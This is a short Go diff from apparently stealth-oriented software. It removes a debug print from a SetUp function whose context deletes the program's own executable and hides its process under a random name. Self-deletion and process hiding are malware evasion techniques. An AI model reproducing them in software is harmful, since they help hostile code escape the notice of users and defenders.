@@ -40,7 +40,6 @@ func SetUp() {
 			}
 		}
 		path, _ := util.GetExecPathEx()
-		fmt.Println(path)
 		defer os.Remove(path)
 		name := util.GetRandomProcessName()
 		hide.Hide(name)
